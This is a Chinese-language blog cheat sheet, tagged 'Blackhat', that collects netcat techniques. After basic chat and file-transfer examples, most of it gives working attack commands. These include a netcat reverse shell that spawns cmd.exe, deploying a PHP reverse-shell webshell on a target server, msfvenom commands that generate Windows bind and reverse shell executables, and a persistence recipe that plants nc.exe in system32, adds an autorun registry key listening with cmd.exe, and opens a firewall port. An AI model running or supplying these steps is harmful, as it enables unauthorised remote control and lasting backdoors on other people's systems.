---
title: Netcat常用方法汇总
name: netcat-general
date: 2017-11-11
tags: [nc,netcat]
categories: [Blackhat]
---

* 目录
{:toc}

---

# Netcat常用方法汇总

## 1. 基本使用

### 1.1 聊天工具

```shell
# 服务端
nc -lvp 5678
# 客户端
nc 192.168.1.15 5678
```

### 1.2 文件传输

```shell
# 接收端
nc -lvp 5555 > a.zip
# 发送端
nc 192.168.1.5 5678 < cms.zip
```

### 1.3 反向后门

```shell
# 监听端
nc -lvp 5678
# 控制端
nc 192.168.1.5 5678 -e cmd.exe
```

## 2. 综合使用

### 2.1 结合php反向后门

```shell
# 控制端启动监听
nc -lvp 1234
```

编辑php反弹shell后门，`vi /usr/share/webshells/php/php-reverse-shell.php`，修改 **$ip** 和 **$port** 为控制端的地址和端口
将 `php-reverse-shell.php` 文件上传至目标服务器中，通过浏览器触发 `php-reverse-shell.php` 文件路径，在nc终端中的到反弹shell

### 2.2 结合msfvenom使用

**windows/shell_hidden_bind_tcp**

```shell
msfvenom –p windows/shell_hidden_bind_tcp ahost=192.168.0.107 lport=4444 –f exe > root.exe
nc 192.168.0.103 4444
```

**windows/shell_reverse_tcp**

```shell
msfvenom –p windows/shell_reverse_tcp  lhost=192.168.0.107 lport=8888 –f exe > root.exe
nc -lvp 8888
```

### 2.3 做持久化后门使用

```shell
# 将nc.exe上传至目标服务器中指定目录
msf > upload /usr/share/windows-binaries/nc.exe C:\\Windows\\system32

# 切换到目标cmd环境
msf > shell

# 添加自启动注册表项
C:\WINDOWS> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'

# 添加nc出入站防火墙规则
C:\WINDOWS> netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445

# 检查nc防火墙是否已经开放
C:\WINDOWS> netsh firewall show portopening

# 重启目标电脑，使用nc连接
C:\WINDOWS> nc -nv 192.168.0.101 4445
```
